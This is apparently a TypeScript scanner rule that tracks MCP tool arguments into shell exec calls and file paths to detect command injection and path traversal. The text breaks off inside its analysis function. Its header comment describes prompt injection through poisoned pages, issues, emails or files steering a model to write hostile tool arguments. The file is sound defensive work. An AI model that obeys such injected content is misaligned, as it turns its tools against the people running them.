import { Node, SyntaxKind, type CallExpression, type SourceFile } from "ts-morph";
import type { Evidence, Finding, Rule, RuleContext, TraceStep } from "../types.js";
import { getCallsWithin, getFileCalls, getNodeLine, getRelativeFilePath } from "../../utils/ast.js";
import { demoteEvidence, evidenceConfidence, identifierTokens, isTestFilePath } from "../confidence.js";
import { getObjectProperty, getStringValue, resolveIdentifierModule } from "./llm-rule-utils.js";
import { fileImportsMcpServerSdk } from "./mcp-tool-poisoning.js";

/**
 * MCP013 / MCP014 — an MCP tool argument reaches a shell command or a
 * filesystem path.
 *
 * Tool arguments are written by the model, and the model writes whatever a
 * prompt injection (a poisoned web page, issue, email, or file it read) tells
 * it to. Command injection and path traversal in tool handlers are the two
 * largest classes of real MCP server CVEs (Anthropic's own Git and
 * Filesystem servers among them).
 *
 * Precision contract: both rules report at default evidence only when the
 * code shows an *intent that the argument fails to respect*:
 *
 *  - MCP013 needs the argument interpolated into a fixed command
 *    (`exec(\`git log ${branch}\`)`): the author meant to run `git log`, the
 *    model can run anything. A bare `exec(args.command)` is a "run a command"
 *    tool by design — reported only as `heuristic`.
 *  - MCP014 needs the argument joined onto a base directory
 *    (`path.join(ROOT, file)`): the author meant to stay inside ROOT, `../`
 *    walks out. A bare `readFile(args.path)` is a full-access file tool by
 *    design — reported only as `heuristic`.
 *
 * Any visible guard (a quoting/escaping/validation call, a regex test, an
 * allowlist `.includes`, a `startsWith` containment check, or a schema that
 * restricts the value to a number/boolean/enum/regex) anywhere along the path
 * suppresses the finding.
 *
 * Real servers rarely run the command in the handler itself: the handler
 * dispatches to a tool function in another file or a class method, which
 * builds the command and hands it to a promisified exec. Taint is followed
 * into callees (functions, arrow consts, methods, imports) for up to
 * MAX_HOPS calls; a finding that crossed a call boundary is capped at
 * `likely`, like AI001's interprocedural traces.
 */

const MAX_HOPS = 4;

const CHILD_PROCESS_MODULES = new Set(["child_process", "node:child_process"]);
const FS_MODULES = new Set(["fs", "node:fs", "fs/promises", "node:fs/promises", "fs-extra"]);
const PATH_MODULES = new Set(["path", "node:path"]);

const ALWAYS_SHELL = new Set(["exec", "execSync"]);
const SHELL_WHEN_OPTED = new Set(["spawn", "spawnSync", "execFile", "execFileSync"]);
const FS_PATH_METHODS = new Set([
  "readFile", "readFileSync", "writeFile", "writeFileSync", "appendFile", "appendFileSync",
  "createReadStream", "createWriteStream", "unlink", "unlinkSync", "rm", "rmSync",
  "readdir", "readdirSync", "copyFile", "copyFileSync", "rename", "renameSync",
  "outputFile", "outputFileSync", "remove", "removeSync",
]);

// Calls that, given the tainted value, count as a guard on it.
const GUARD_TOKENS = new Set([
  "quote", "escape", "sanitize", "sanitise", "validate", "validator", "assert", "check",
  "safe", "allowed", "allow", "allowlist", "whitelist", "within", "contain", "contains",
  "inside", "guard", "verify", "clean", "normalize", "realpath",
]);
const GUARD_METHODS = new Set(["test", "match", "matchAll", "startsWith", "safeParse"]);
// Schema shapes that cannot carry a shell metacharacter or `../`.
const RESTRICTIVE_SCHEMA = /z\s*\.\s*(?:number|boolean|enum|nativeEnum|literal|bigint)\b|\.(?:regex|uuid|int|ip|email|cuid2?|ulid)\s*\(/;

type SinkKind = "shell" | "fs";

interface Taint {
  origin: string;
  originFile: string;
  originLine: number;
  /** tool argument field the value came from, for schema/guard lookups */
  field: string;
  /** text was composed (template/concat) with fixed text on the way */
  composed: boolean;
  /** joined onto a base directory (path.join(BASE, x), `${BASE}/${x}`) */
  baseJoined: boolean;
}

/** A function body being analyzed: the tool handler itself, or a callee taint reached. */
interface Scope {
  toolName: string;
  fn: Node;
  /** tainted identifiers seeded on entry (handler params, or the callee param a tainted value was passed to) */
  seeds: Map<string, Taint>;
  /** identifiers / property chains that hold the whole tool-argument object */
  argObjects: Set<string>;
  /** zod/JSON-schema text per argument name, from the tool registration */
  schema: Map<string, string>;
  hops: number;
  /** trace steps accumulated by the calls that led here */
  path: TraceStep[];
  /** caller scopes, innermost last — guards anywhere along the path count */
  callers: Array<{ fn: Node; names: Set<string> }>;
}

function calleeName(call: CallExpression): string {
  const expr = call.getExpression();
  if (Node.isPropertyAccessExpression(expr)) return expr.getName();
  return expr.getText();
}

function safeModule(identifier: Node): string | undefined {
  try {
    return resolveIdentifierModule(identifier);
  } catch {
    return undefined;
  }
}

function leftmostIdentifier(node: Node): Node | undefined {
  let current: Node = node;
  while (Node.isPropertyAccessExpression(current) || Node.isElementAccessExpression(current)) {
    current = current.getExpression();
  }
  return Node.isIdentifier(current) ? current : undefined;
}

/**
 * Resolve a callee to `{ module, method }` through real imports:
 * `exec` (named import), `cp.exec`, `fs.promises.readFile`, and
 * `const run = promisify(exec)`.
 */
function resolveNodeApi(callee: Node, depth = 0): { module: string; method: string } | undefined {
  if (depth > 3) return undefined;
  if (Node.isPropertyAccessExpression(callee)) {
    const root = leftmostIdentifier(callee);
    const module = root ? safeModule(root) : undefined;
    return module ? { module, method: callee.getName() } : undefined;
  }
  if (!Node.isIdentifier(callee)) return undefined;
  const symbol = callee.getSymbol();
  for (const decl of symbol?.getDeclarations() ?? []) {
    if (Node.isImportSpecifier(decl)) {
      const module = decl.getImportDeclaration().getModuleSpecifierValue();
      if (!module.startsWith(".")) return { module, method: decl.getName() };
      // `import { execAsync } from "./utils/exec.js"` → follow to its declaration.
      const target = symbol?.getAliasedSymbol()?.getDeclarations()[0];
      const init = target && Node.isVariableDeclaration(target) ? target.getInitializer() : undefined;
      if (init && Node.isCallExpression(init) && /(?:^|\.)promisify$/.test(init.getExpression().getText())) {
        const inner = init.getArguments()[0];
        if (inner) return resolveNodeApi(inner, depth + 1);
      }
      return undefined;
    }
    if (Node.isVariableDeclaration(decl)) {
      const init = decl.getInitializer();
      // const run = promisify(exec) / util.promisify(cp.exec)
      if (init && Node.isCallExpression(init) && /(?:^|\.)promisify$/.test(init.getExpression().getText())) {
        const inner = init.getArguments()[0];
        if (inner) return resolveNodeApi(inner, depth + 1);
      }
      // const { exec } = require("child_process")
      const nameNode = decl.getNameNode();
      if (init && Node.isObjectBindingPattern(nameNode) && Node.isCallExpression(init) && init.getExpression().getText() === "require") {
        const spec = getStringValue(init.getArguments()[0] ?? init);
        const element = nameNode.getElements().find((el) => el.getName() === callee.getText());
        if (spec && element) return { module: spec, method: element.getPropertyNameNode()?.getText() ?? element.getName() };
      }
    }
  }
  return undefined;
}

function classifySink(call: CallExpression): SinkKind | undefined {
  const api = resolveNodeApi(call.getExpression());
  if (!api) return undefined;
  if (CHILD_PROCESS_MODULES.has(api.module)) {
    if (ALWAYS_SHELL.has(api.method)) return "shell";
    if (SHELL_WHEN_OPTED.has(api.method)) {
      const opts = call.getArguments().find((arg) => Node.isObjectLiteralExpression(arg));
      const shell = opts && Node.isObjectLiteralExpression(opts) ? getObjectProperty(opts, "shell") : undefined;
      return shell && shell.getText() !== "false" ? "shell" : undefined;
    }
    return undefined;
  }
  if (FS_MODULES.has(api.module) && FS_PATH_METHODS.has(api.method)) return "fs";
  return undefined;
}

function isPathJoin(call: CallExpression): boolean {
  const api = resolveNodeApi(call.getExpression());
  return !!api && PATH_MODULES.has(api.module) && (api.method === "join" || api.method === "resolve");
}

// ── Function resolution ─────────────────────────────────────────────────────

type FunctionLike = Node & { getParameters(): import("ts-morph").ParameterDeclaration[] };

function asFunction(node: Node | undefined, depth = 0): FunctionLike | undefined {
  if (!node) return undefined;
  if (
    Node.isFunctionDeclaration(node) ||
    Node.isArrowFunction(node) ||
    Node.isFunctionExpression(node) ||
    Node.isMethodDeclaration(node)
  ) {
    return node.getBody() ? (node as FunctionLike) : undefined;
  }
  // const run = (cmd) => ... / class field `run = async (cmd) => ...` / { run: function () {} }
  if (Node.isVariableDeclaration(node) || Node.isPropertyDeclaration(node) || Node.isPropertyAssignment(node)) {
    const init = node.getInitializer();
    if (init && (Node.isArrowFunction(init) || Node.isFunctionExpression(init))) return init as FunctionLike;
    // { handler: getFigmaData } — a property naming a function declared elsewhere
    if (init && Node.isIdentifier(init) && depth < 2) {
      try {
        for (const decl of init.getSymbol()?.getDeclarations() ?? []) {
          const fn = asFunction(decl, depth + 1);
          if (fn) return fn;
        }
      } catch {
        return undefined;
      }
    }
  }
  return undefined;
}

/** The project function a call (or a handler reference) resolves to: local, imported, or a method. */
function resolveFunction(target: Node, projectFiles: Set<SourceFile>): FunctionLike | undefined {
  try {
    const nameNode = Node.isPropertyAccessExpression(target) ? target.getNameNode() : target;
    if (!Node.isIdentifier(nameNode)) return undefined;
    let symbol = nameNode.getSymbol();
    if (!symbol) return undefined;
    if (symbol.getDeclarations().some((d) => Node.isImportSpecifier(d) || Node.isImportClause(d))) {
      symbol = symbol.getAliasedSymbol() ?? symbol;
    }
    for (const decl of symbol.getDeclarations()) {
      if (!projectFiles.has(decl.getSourceFile())) continue;
      const fn = asFunction(decl);
      if (fn) return fn;
    }
  } catch {
    // ts-morph symbol resolution can throw on malformed input; never abort the scan.
  }
  return undefined;
}

// ── Tool handler discovery ──────────────────────────────────────────────────

function handlerArg(args: Node[], projectFiles: Set<SourceFile>): FunctionLike | undefined {
  const last = args[args.length - 1];
  if (!last) return undefined;
  if (Node.isArrowFunction(last) || Node.isFunctionExpression(last)) return last as FunctionLike;
  // server.tool("stop", schema, stopHandler) — a reference to a named function
  if (Node.isIdentifier(last) || Node.isPropertyAccessExpression(last)) return resolveFunction(last, projectFiles);
  return undefined;
}

function shapeSchema(shape: Node | undefined): Map<string, string> {
  const schema = new Map<string, string>();
  let node = shape;
  // z.object({ ... }) → the object literal inside
  if (node && Node.isCallExpression(node)) node = node.getArguments()[0];
  if (!node || !Node.isObjectLiteralExpression(node)) return schema;
  for (const prop of node.getProperties()) {
    if (Node.isPropertyAssignment(prop)) schema.set(prop.getName(), prop.getInitializer()?.getText() ?? "");
  }
  return schema;
}

/** "git_log" from a string literal, or from `fooTool.name` where fooTool = { name: "git_log", ... }. */
function toolNameOf(node: Node | undefined): string | undefined {
  if (!node) return undefined;
  const literal = getStringValue(node);
  if (literal !== undefined) return literal;
  if (Node.isPropertyAccessExpression(node)) {
    try {
      for (const decl of node.getNameNode().getSymbol()?.getDeclarations() ?? []) {
        if (Node.isPropertyAssignment(decl)) {
          const init = decl.getInitializer();
          const value = init ? getStringValue(init) : undefined;
          if (value !== undefined) return value;
        }
      }
    } catch {
      // fall through to the expression text
    }
    return node.getText();
  }
  return undefined;
}

function rootTaint(field: string, file: string, line: number): Taint {
  return { origin: `tool argument \`${field}\``, originFile: file, originLine: line, field, composed: false, baseJoined: false };
}

/**
 * Seed a scope from parameter `index` of `fn`: the whole argument object,
 * a tainted value, or (`fields`) an object literal whose listed properties
 * are tainted — `handleCreate({ title: args.title, n: Number(args.n) })`
 * taints `params.title` in the callee, not `params.n`.
 */
function seedParameter(fn: FunctionLike, index: number, scope: Scope, inherited?: Taint, fields?: Map<string, Taint>): void {
  const param = fn.getParameters()[index];
  if (!param) return;
  const nameNode = param.getNameNode();
  const file = fn.getSourceFile().getFilePath();
  if (fields) {
    if (Node.isIdentifier(nameNode)) {
      for (const [field, taint] of fields) scope.seeds.set(`${nameNode.getText()}.${field}`, taint);
    } else if (Node.isObjectBindingPattern(nameNode)) {
      for (const element of nameNode.getElements()) {
        const taint = fields.get(element.getPropertyNameNode()?.getText() ?? element.getName());
        if (taint) scope.seeds.set(element.getName(), taint);
      }
    }
    return;
  }
  if (Node.isIdentifier(nameNode)) {
    if (inherited) scope.seeds.set(nameNode.getText(), inherited);
    else scope.argObjects.add(nameNode.getText());
  } else if (Node.isObjectBindingPattern(nameNode) && !inherited) {
    for (const element of nameNode.getElements()) {
      const field = element.getPropertyNameNode()?.getText() ?? element.getName();
      scope.seeds.set(element.getName(), rootTaint(field, file, getNodeLine(element)));
    }
  }
}

function newScope(toolName: string, fn: FunctionLike, schema: Map<string, string>): Scope {
  return { toolName, fn, seeds: new Map(), argObjects: new Set(), schema, hops: 0, path: [], callers: [] };
}

function collectHandlers(sourceFile: SourceFile, projectFiles: Set<SourceFile>): Scope[] {
  const handlers: Scope[] = [];
  for (const call of getFileCalls(sourceFile)) {
    const callee = call.getExpression();
    if (!Node.isPropertyAccessExpression(callee)) continue;
    const method = callee.getName();
    const args = call.getArguments();

    if (method === "tool" || method === "registerTool") {
      // server.tool(name, [description], [shape], handler)
      // server.registerTool(name, { inputSchema }, handler)
      const toolName = toolNameOf(args[0]);
      const fn = handlerArg(args, projectFiles);
      if (!toolName || !fn) continue;
      let schema = new Map<string, string>();
      for (const arg of args.slice(1, -1)) {
        if (!Node.isObjectLiteralExpression(arg)) continue;
        schema = shapeSchema(method === "registerTool" ? getObjectProperty(arg, "inputSchema") : arg);
      }
      const scope = newScope(toolName, fn, schema);
      seedParameter(fn, 0, scope);
      handlers.push(scope);
    } else if (method === "addTool" && args[0] && Node.isObjectLiteralExpression(args[0])) {
      // fastmcp: server.addTool({ name, parameters: z.object({...}), execute })
      const obj = args[0];
      const nameNode = getObjectProperty(obj, "name");
      const name = nameNode ? getStringValue(nameNode) : undefined;
      const executeProp = obj.getProperty("execute");
      const executeRef = getObjectProperty(obj, "execute");
      const fn = (executeProp ? asFunction(executeProp) : undefined) ?? (executeRef ? handlerArg([executeRef], projectFiles) : undefined);
      if (!name || !fn) continue;
      const scope = newScope(name, fn, shapeSchema(getObjectProperty(obj, "parameters")));
      seedParameter(fn, 0, scope);
      handlers.push(scope);
    } else if (method === "setRequestHandler" && args[0]?.getText().includes("CallToolRequestSchema")) {
      // Low-level API: request.params.arguments, dispatched on request.params.name
      const fn = handlerArg(args, projectFiles);
      const requestParam = fn?.getParameters()[0]?.getNameNode();
      if (!fn || !requestParam || !Node.isIdentifier(requestParam)) continue;
      const scope = newScope("(CallTool handler)", fn, new Map());
      scope.argObjects.add(`${requestParam.getText()}.params.arguments`);
      handlers.push(scope);
    }
  }
  return handlers;
}

// ── Taint within a scope ────────────────────────────────────────────────────

function unwrap(node: Node): Node {
  let current = node;
  while (
    Node.isAwaitExpression(current) ||
    Node.isParenthesizedExpression(current) ||
    Node.isAsExpression(current) ||
    Node.isNonNullExpression(current) ||
    Node.isTypeAssertion(current) ||
    Node.isSatisfiesExpression(current)
  ) {
    current = current.getExpression();
  }
  return current;
}

function normalizedText(node: Node): string {
  return unwrap(node).getText().replace(/\?\./g, ".").replace(/\s+/g, "");
}

/** Is `node` a direct reference to a tool-argument object (`args`, `request.params.arguments`)? */
function isArgObject(node: Node, objects: Set<string>): boolean {
  const inner = unwrap(node);
  // `args ?? {}` / `args || {}`
  if (Node.isBinaryExpression(inner) && ["??", "||"].includes(inner.getOperatorToken().getText())) {
    return isArgObject(inner.getLeft(), objects);
  }
  return objects.has(normalizedText(inner));
}

/** `args.branch`, `args["branch"]`, `request.params.arguments.branch` → "branch". */
function argFieldName(node: Node, objects: Set<string>): string | undefined {
  const inner = unwrap(node);
  if (Node.isPropertyAccessExpression(inner) && isArgObject(inner.getExpression(), objects)) return inner.getName();
  if (Node.isElementAccessExpression(inner) && isArgObject(inner.getExpression(), objects)) {
    const key = inner.getArgumentExpression();
    return key ? getStringValue(key) : undefined;
  }
  return undefined;
}

interface ScopeTaint {
  vars: Map<string, Taint>;
  objects: Set<string>;
}

function buildTaint(scope: Scope): ScopeTaint {
  const vars = new Map(scope.seeds);
  const objects = new Set(scope.argObjects);
  const file = scope.fn.getSourceFile().getFilePath();
  const state: ScopeTaint = { vars, objects };

  const decls = scope.fn.getDescendantsOfKind(SyntaxKind.VariableDeclaration);
  const assignments = scope.fn
    .getDescendantsOfKind(SyntaxKind.BinaryExpression)
    .filter((b) => ["=", "+="].includes(b.getOperatorToken().getText()) && Node.isIdentifier(b.getLeft()));

  for (let pass = 0; pass < 4; pass += 1) {
    let changed = false;
    for (const decl of decls) {
      const init = decl.getInitializer();
      if (!init) continue;
      const nameNode = decl.getNameNode();

      // const args = request.params.arguments (as X)
      if (Node.isIdentifier(nameNode)) {
        if (isArgObject(init, objects)) {
          if (!objects.has(nameNode.getText())) {
            objects.add(nameNode.getText());
            changed = true;
          }
          continue;
        }
        if (vars.has(nameNode.getText())) continue;
        const taint = expressionTaint(init, state);
        if (taint) {
          vars.set(nameNode.getText(), taint);
          changed = true;
        }
        continue;
      }
      // const { name, arguments: args } = request.params / const { branch } = args
      if (Node.isObjectBindingPattern(nameNode)) {
        const initText = normalizedText(init);
        for (const element of nameNode.getElements()) {
          const bound = element.getName();
          const property = element.getPropertyNameNode()?.getText() ?? bound;
          if (objects.has(`${initText}.${property}`)) {
            if (!objects.has(bound)) {
              objects.add(bound);
              changed = true;
            }
          } else if (isArgObject(init, objects) && !vars.has(bound)) {
            vars.set(bound, rootTaint(property, file, getNodeLine(element)));
            changed = true;
          }
        }
      }
    }
    // command = "kubectl get " + type; command += ` -n ${ns}`
    for (const assignment of assignments) {
      const name = assignment.getLeft().getText();
      const right = expressionTaint(assignment.getRight(), state);
      if (!right) continue;
      const isAppend = assignment.getOperatorToken().getText() === "+=";
      const existing = vars.get(name);
      const next: Taint = { ...right, composed: right.composed || isAppend, baseJoined: right.baseJoined || (isAppend && !!existing?.baseJoined) };
      if (existing && existing.composed >= next.composed && existing.baseJoined >= next.baseJoined) continue;
      vars.set(name, existing ? { ...existing, composed: existing.composed || next.composed, baseJoined: existing.baseJoined || next.baseJoined } : next);
      changed = true;
    }
    if (!changed) break;
  }
  return state;
}

/** Taint carried by an expression, with how it was shaped on the way. */
function expressionTaint(node: Node, state: ScopeTaint): Taint | undefined {
  const inner = unwrap(node);
  const field = argFieldName(inner, state.objects);
  if (field !== undefined) return rootTaint(field, inner.getSourceFile().getFilePath(), getNodeLine(inner));
  if (Node.isIdentifier(inner)) return state.vars.get(inner.getText());
  // `params.title` where the caller passed { title: args.title } — per-field taint.
  if (Node.isPropertyAccessExpression(inner)) {
    const fieldTaint = state.vars.get(normalizedText(inner));
    if (fieldTaint) return fieldTaint;
  }
  // cond ? `go doc ${pkg}.${sym}` : `go doc ${pkg}`
  if (Node.isConditionalExpression(inner)) {
    return expressionTaint(inner.getWhenTrue(), state) ?? expressionTaint(inner.getWhenFalse(), state);
  }
  // `args.x ?? "default"` / `args.x || "default"`
  if (Node.isBinaryExpression(inner) && ["??", "||"].includes(inner.getOperatorToken().getText())) {
    return expressionTaint(inner.getLeft(), state);
  }

  if (Node.isTemplateExpression(inner)) {
    const spans = inner.getTemplateSpans();
    const head = inner.getHead().getLiteralText();
    const hasFixedText = head.trim() !== "" || spans.some((s) => s.getLiteral().getLiteralText().trim() !== "");
    for (let i = 0; i < spans.length; i += 1) {
      const taint = expressionTaint(spans[i].getExpression(), state);
      if (!taint) continue;
      const before = i === 0 ? head : spans[i - 1].getLiteral().getLiteralText();
      // `${BASE}/${file}` or `/srv/data/${file}`: fixed path text precedes the tainted span.
      const priorUntainted = spans.slice(0, i).some((s) => !expressionTaint(s.getExpression(), state));
      const baseJoined = taint.baseJoined || (/\/$/.test(before) && (priorUntainted || head.length > 1));
      return { ...taint, composed: taint.composed || hasFixedText, baseJoined };
    }
    return undefined;
  }

  if (Node.isBinaryExpression(inner) && inner.getOperatorToken().getKind() === SyntaxKind.PlusToken) {
    const left = expressionTaint(inner.getLeft(), state);
    const right = expressionTaint(inner.getRight(), state);
    const taint = left ?? right;
    if (!taint) return undefined;
    const baseJoined = taint.baseJoined || (!left && !!right && /\/["'`]$/.test(inner.getLeft().getText()));
    return { ...taint, composed: true, baseJoined };
  }

  if (Node.isCallExpression(inner)) {
    const args = inner.getArguments();
    if (isPathJoin(inner)) {
      for (let i = 0; i < args.length; i += 1) {
        const taint = expressionTaint(args[i], state);
        if (!taint) continue;
        // path.join(BASE, file): an untainted segment precedes the tainted one.
        const priorUntainted = args.slice(0, i).some((a) => !expressionTaint(a, state));
        return { ...taint, baseJoined: taint.baseJoined || priorUntainted };
      }
      return undefined;
    }
    // String(x) / x.toString() / x.trim() / [..].join(" ") keep the value.
    const callee = inner.getExpression();
    if (callee.getText() === "String" && args[0]) return expressionTaint(args[0], state);
    if (Node.isPropertyAccessExpression(callee)) {
      const method = callee.getName();
      if (["toString", "trim", "toLowerCase", "toUpperCase"].includes(method)) return expressionTaint(callee.getExpression(), state);
      if (method === "join") {
        const receiver = unwrap(callee.getExpression());
        if (Node.isArrayLiteralExpression(receiver)) {
          const elements = receiver.getElements();
          const index = elements.findIndex((el) => expressionTaint(el, state));
          if (index < 0) return undefined;
          const taint = expressionTaint(elements[index], state)!;
          return { ...taint, composed: taint.composed || elements.length > 1 };
        }
      }
    }
  }
  return undefined;
}

// ── Guards ──────────────────────────────────────────────────────────────────

const MEMBERSHIP_METHODS = new Set(["includes", "has", "indexOf"]);
const ALLOWLIST_TOKENS = new Set(["allowed", "allow", "allowlist", "whitelist", "valid", "supported", "permitted", "known", "safe"]);

function mentions(text: string, name: string): boolean {
  return new RegExp(`(?:^|[^\\w$])${name.replace(/[$]/g, "\\$")}(?:[^\\w$]|$)`).test(text);
}

function regexValidates(node: Node, depth = 0): boolean {
  const inner = unwrap(node);
  if (Node.isRegularExpressionLiteral(inner)) {
    const source = inner.getLiteralText().replace(/\/[a-z]*$/, "").slice(1);
    return (source.startsWith("^") && source.endsWith("$")) || /\[[^\]]*[;&|`$<>][^\]]*\]/.test(source);
  }
  if (Node.isIdentifier(inner) && depth < 2) {
    try {
      const decl = inner.getSymbol()?.getDeclarations()[0];
      const init = decl && Node.isVariableDeclaration(decl) ? decl.getInitializer() : undefined;
      if (init) return regexValidates(init, depth + 1);
    } catch {
      return true;
    }
  }
  // A regex we can't see (built at runtime, imported): assume it validates.
  return true;
}

/**
 * Does `call` guard any of `names`? A guard-named call (`validatePath(p)`,
 * `shellQuote(x)`), a regex `.test`/`.match`, a containment `startsWith`, or
 * a membership test. Membership counts only against an allowlist
 * (`ALLOWED.includes(x)`, `["a","b"].includes(x)`, `allowedHosts.has(x)`) or
 * as a dangerous-token probe on the value itself (`x.includes("..")`):
 * `fileText.includes(x)` searches a file for the value and validates nothing.
 */
function guards(call: CallExpression, names: Set<string>): boolean {
  const callee = call.getExpression();
  const method = Node.isPropertyAccessExpression(callee) ? callee.getName() : undefined;
  const receiverText = method && Node.isPropertyAccessExpression(callee) ? callee.getExpression().getText() : "";
  // String literals are never references: `lower.startsWith("description")`
  // does not mention a variable named `description`.
  const argsText = call
    .getArguments()
    .filter((arg) => !Node.isStringLiteral(arg) && !Node.isNoSubstitutionTemplateLiteral(arg))
    .map((arg) => arg.getText())
    .join(" ");
  const onValue = [...names].some((name) => mentions(receiverText, name));
  const onArgs = [...names].some((name) => mentions(argsText, name));
  if (!onValue && !onArgs) return false;

  // `x.includes("..")` / `x.startsWith("-")` probe the value for a dangerous
  // token; `x.includes("github.com")` is a routing branch, not a guard.
  if (method && onValue && (MEMBERSHIP_METHODS.has(method) || method === "startsWith")) {
    const probe = call.getArguments()[0];
    const literal = probe ? getStringValue(probe) : undefined;
    if (literal !== undefined) return literal !== "" && !/[A-Za-z0-9]/.test(literal);
    return method === "startsWith"; // x.startsWith(ROOT): containment check
  }
  if (method && MEMBERSHIP_METHODS.has(method)) {
    const receiver = Node.isPropertyAccessExpression(callee) ? unwrap(callee.getExpression()) : callee;
    if (Node.isArrayLiteralExpression(receiver)) return true;
    const receiverName = Node.isPropertyAccessExpression(receiver) ? receiver.getName() : receiver.getText();
    return /^[A-Z][A-Z0-9_]*$/.test(receiverName) || identifierTokens(receiverName).some((t) => ALLOWLIST_TOKENS.has(t));
  }
  // Regex: `RE.test(x)` / `x.match(RE)` validate only when RE checks the whole
  // value (`/^[\w.-]+$/`) or probes for metacharacters (`/[;&|$]/`).
  // `x.match(/github\.com\/(.+)/)` extracts parts and validates nothing.
  if (method === "test" || method === "match" || method === "matchAll") {
    const regexNode = method === "test" && Node.isPropertyAccessExpression(callee) ? callee.getExpression() : call.getArguments()[0];
    return regexNode ? regexValidates(regexNode) : false;
  }
  if (method && GUARD_METHODS.has(method)) return true;
  const name = method ?? callee.getText();
  return identifierTokens(name).some((token) => GUARD_TOKENS.has(token));
}

/**
 * Any guard on the value in `fn`: a tainted name (or the tool field it came
 * from) inside a guard-shaped call, as receiver or argument. Coarse on
 * purpose: a guard we can't evaluate still means someone thought about it,
 * and these rules only speak when nobody did.
 */
function guardedIn(fn: Node, names: Set<string>, sink: CallExpression | undefined): boolean {
  if (names.size === 0) return false;
  for (const call of getCallsWithin(fn)) {
    if (call === sink || classifySink(call)) continue;
    if (guards(call, names)) return true;
  }
  return false;
}

// ── Reaching definitions at a sink ─────────────────────────────────────────

type Write = { node: Node; container: Node | undefined; append: boolean; value: Node | undefined };

/** The block-like statement list a write sits in (its parent block, case clause, or file). */
function statementContainer(node: Node): Node | undefined {
  let current: Node | undefined = node.getParent();
  while (current && !Node.isBlock(current) && !Node.isCaseClause(current) && !Node.isDefaultClause(current) && !Node.isSourceFile(current)) {
    current = current.getParent();
  }
  return current;
}

/** `name = helper(name, ...)`: a call that takes the value back in, and isn't a guard. */
function passesThrough(value: Node | undefined, name: string): boolean {
  const inner = value ? unwrap(value) : undefined;
  if (!inner || !Node.isCallExpression(inner)) return false;
  if (!inner.getArguments().some((arg) => mentions(arg.getText(), name))) return false;
  const callee = inner.getExpression();
  const calleeName = Node.isPropertyAccessExpression(callee) ? callee.getName() : callee.getText();
  return !identifierTokens(calleeName).some((token) => GUARD_TOKENS.has(token));
}

/**
 * Taint of a sink argument, flow-sensitively when it is a reassigned local.
 * `buildTaint` is flow-insensitive: one `command` variable reused across
 * switch cases (`command = "kubectl config get-contexts"` in one case,
 * `` command = `kubectl config use-context ${name}` `` in a later one) would
 * taint every exec of it. Found in mcp-server-kubernetes: static-command
 * cases were flagged because a *later* case assigned tool data. Here only
 * writes before the sink count; a plain assignment in a block enclosing the
 * sink replaces earlier values, while `+=` and writes in branches that may
 * or may not run add to them.
 */
function sinkArgumentTaint(argNode: Node, sink: CallExpression, fn: Node, state: ScopeTaint): Taint | undefined {
  const inner = unwrap(argNode);
  if (!Node.isIdentifier(inner)) return expressionTaint(argNode, state);
  const name = inner.getText();
  const writes: Write[] = [];
  for (const decl of fn.getDescendantsOfKind(SyntaxKind.VariableDeclaration)) {
    if (decl.getName() === name) writes.push({ node: decl, container: statementContainer(decl), append: false, value: decl.getInitializer() });
  }
  for (const assignment of fn.getDescendantsOfKind(SyntaxKind.BinaryExpression)) {
    const operator = assignment.getOperatorToken().getText();
    if ((operator !== "=" && operator !== "+=") || assignment.getLeft().getText() !== name) continue;
    writes.push({ node: assignment, container: statementContainer(assignment), append: operator === "+=", value: assignment.getRight() });
  }
  // A seeded parameter or a name with no local writes: nothing to order.
  if (writes.length === 0) return expressionTaint(argNode, state);

  const sinkStart = sink.getStart();
  let current: Taint | undefined = state.vars.get(name) && !writes.some((w) => Node.isVariableDeclaration(w.node)) ? state.vars.get(name) : undefined;
  for (const write of writes.filter((w) => w.node.getEnd() <= sinkStart).sort((a, b) => a.node.getStart() - b.node.getStart())) {
    const written = write.value ? expressionTaint(write.value, state) : undefined;
    const dominates = !!write.container && (write.container === statementContainer(sink) || sink.getAncestors().includes(write.container));
    if (write.append) {
      if (written) current = { ...written, composed: true, baseJoined: written.baseJoined || !!current?.baseJoined };
      else if (current) current = { ...current, composed: true };
    } else if (dominates) {
      // `cmd = addOptions(cmd, args)` passes the value through and keeps it;
      // `cmd = shellQuote(cmd)` / `cmd = "static"` replaces it.
      current = written ?? (current && passesThrough(write.value, name) ? { ...current, composed: true } : undefined);
    } else if (written) {
      current = current ? { ...current, composed: current.composed || written.composed, baseJoined: current.baseJoined || written.baseJoined } : written;
    }
  }
  return current;
}

/** Names in this scope that carry the same tool field as `taint`. */
function namesFor(state: ScopeTaint, taint: Taint): Set<string> {
  const names = new Set<string>([taint.field]);
  for (const [name, info] of state.vars) if (info.field === taint.field) names.add(name);
  return names;
}

// ── Analysis ────────────────────────────────────────────────────────────────

/** In a low-level CallTool dispatcher, the tool name from the enclosing `if (name === "x")` / `case "x":`. */
function dispatchedToolName(node: Node, stop: Node, fallback: string): string {
  let current: Node | undefined = node.getParent();
  while (current && current !== stop) {
    if (Node.isCaseClause(current)) {
      const value = getStringValue(current.getExpression());
      if (value) return value;
    }
    if (Node.isIfStatement(current)) {
      const match = /===?\s*["'`]([\w.:-]+)["'`]|["'`]([\w.:-]+)["'`]\s*===?/.exec(current.getExpression().getText());
      if (match) return match[1] ?? match[2];
    }
    current = current.getParent();
  }
  return fallback;
}

interface SinkHit {
  kind: SinkKind;
  evidence: Evidence;
  file: string;
  line: number;
  toolName: string;
  trace: TraceStep[];
  bare: boolean;
}

// Bound on scopes explored from one tool handler, so a dispatcher over a
// large codebase can't fan out without limit.
const MAX_SCOPES_PER_HANDLER = 2000;

/** A scope is re-entered only with a seed shape not seen before: the same helper reached with a different tainted parameter is a different path. */
function scopeKey(scope: Scope): string {
  return `${[...scope.seeds.keys()].sort().join(",")}|${[...scope.argObjects].sort().join(",")}`;
}

function analyzeScope(
  scope: Scope,
  context: RuleContext,
  projectFiles: Set<SourceFile>,
  visited: Map<Node, Set<string>>,
  hits: SinkHit[],
): void {
  const key = scopeKey(scope);
  const seen = visited.get(scope.fn) ?? new Set<string>();
  if (seen.has(key)) return;
  seen.add(key);
  visited.set(scope.fn, seen);
  let total = 0;
  for (const keys of visited.values()) total += keys.size;
  if (total > MAX_SCOPES_PER_HANDLER) return;
  const state = buildTaint(scope);
  if (state.vars.size === 0 && state.objects.size === 0) return;
  const relFile = getRelativeFilePath(context.rootPath, scope.fn.getSourceFile());

  for (const call of getCallsWithin(scope.fn)) {
    const kind = classifySink(call);
    if (kind) {
      const argNode = call.getArguments()[0];
      const taint = argNode ? sinkArgumentTaint(argNode, call, scope.fn, state) : undefined;
      if (!taint) continue;
